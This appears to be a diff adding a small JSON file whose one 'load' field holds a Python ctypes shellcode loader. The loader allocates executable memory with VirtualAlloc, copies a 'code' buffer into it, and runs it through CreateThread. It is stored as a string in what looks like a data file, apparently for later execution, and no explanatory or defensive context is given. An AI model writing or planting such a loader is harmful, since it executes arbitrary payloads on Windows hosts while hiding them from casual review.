@@ -1,0 +1,3 @@
+{
+  "load":"ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64;rwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(code),0x3000,0x40);ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(code),len(code));handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0);ctypes.windll.kernel32.WaitForSingleObject(handle,-1)"
+}
